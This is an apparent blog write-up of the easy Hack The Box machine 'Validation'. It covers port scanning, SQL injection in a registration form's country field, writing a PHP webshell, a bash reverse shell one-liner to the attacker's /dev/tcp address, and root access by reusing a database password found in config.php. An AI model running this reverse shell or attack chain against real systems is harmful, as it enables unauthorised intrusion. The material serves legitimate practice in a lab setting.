+++
title = "Validation"
date = "2022-06-22T21:03:46-05:00"
author = "l0gan334"
cover = "Validation.png"
tags = ["hacking", "ctf", "HTB"]
keywords = ["", ""]
description = "**HTB | Validation - Write up**"
showFullContent = false
readingTime = false
hideComments = false
+++

**Validation** is a Hack The Box machine ranked easy.

Its main challenge is **SQL Injection** where we're going to be able to write a **webshell** into the web server. 

# Nmap scan
With **nmap** we will find opened ports and examinate them:
```bash 
❯ nmap -p- -sS --min-rate 5000 --open -n -Pn 10.129.84.93 -oG allPorts
```

We are exporting the result in grepable format, which is great to manage with regex and get all the ports without needing to type them one by one:

{{< code language="bash" title="Here you have an useful function you can use for this manner" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep initiated | awk 'NF{print $NF}')"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat extractPorts.tmp
	rm extractPorts.tmp
}
{{< /code >}}
```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.129.84.93
	[*] Open ports: 22,80,4566,8080

[*] Ports copied to clipboard
```

Now that we have the opened ports we can examinate them deeply.
```bash
nmap -sCV -p 22,80,4566.8080 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-23 12:55 -05
Nmap scan report for 10.129.84.93
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds
```

**Port 80** is opened with a **http** service, we can make a quick inspection with **whatweb**:
```bash
❯ whatweb http://10.129.85.93
http://10.129.84.93 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)],
IP[10.129.84.93], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
```

We don't get much information so it's time to visit the page:

{{< image src="/img/sc3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It's a register panel that doesn't seem to do much...

{{< image src="/img/test.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


We will intercept the register request with **Burpsuite** so we can do some tests.
{{< image src="/img/val-2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

After a simple test we see how the *country* field is vulnerable to **SQLI**:
{{< image src="/img/val-1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


We could look for credentials in the dabatase but we can also check if we can write files:
{{< image src="/img/val-3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We will test this by writing "test" into /var/www/html/test.txt which is the default route where the website files are located:
{{< image src="/img/val-4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

And it works!

**Wappalyzer** shows us the programming language used by the website:
{{< image src="/img/val-5.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


So now we can write a simple web shell in **php** and get **Remote Command Execution.**
{{< image src="/img/val-6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

This script will create a **webshell** in **/shell.php** which takes the parameter **cmd** to execute commands:
{{< image src="/img/val-7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Now we can get a reverse shell with this payload:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.161/334 0>&1'
```

Here we specify our **IP address** and the **port** where we're going to set the listener.

As we are sending this payload over **URL** the **'&'** might give us syntax problems so we will url-encode this character as **%26**:
{{< image src="/img/val-9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


Now we check our listener and we wait for the connection:
```bash
❯ nc -lvnp 334
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::334
Ncat: Listening on 0.0.0.0:334
Ncat: Connection from 10.129.83.187.
Ncat: Connection from 10.129.83.187:46728.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$
```


We have a shell but not a **tty** so we will do a **tty treatment**:
```bash
www-data@validation:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@validation:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 334

❯ stty raw -echo; fg
[1]  + continued  nc -lvnp 334
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

And finally the last touches.
```bash
www-data@validation:/var/www/html$ export SHELL=bash
www-data@validation:/var/www/html$ export TERM=xterm
www-data@validation:/var/www/html$ stty rows 40 columns 45
```

This way we will have the correct screen size (you can find your own with ```stty size```) and we are also able to do ^L.


Now that we have everything set we look for the **user flag** and start the enumeration:

```bash
www-data@validation:/var/www/html$ cd /home
www-data@validation:/home$ ls
htb
www-data@validation:/home$ cd htb
www-data@validation:/home/htb$ cat user.txt
18ed73a646e875a23aaaa1**********
```

Nice, we found the **user.txt** now we can move on.

Inside **/var/www/html** we find this:
```bash
www-data@validation:/var/www/html$ ls
account.php  config.php  css  index.php  js
```

There's a configuration file, which are usually very interesting and might contain credentials:
```bash
www-data@validation:/var/www/html$ cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

These are supposed to be **database** credentials, however, we have to check if they're being reused by any user inside the machine, like **root**:
```text
www-data@validation:/var/www/html$ su root
Password:  
root@validation:/var/www/html# whoami
root
```
And it is! Not a hard privilege escalation this time.

```bash
root@validation:/var/www/html# cat /root/root.txt
8e1b95544267b95044**************
```

See you next time!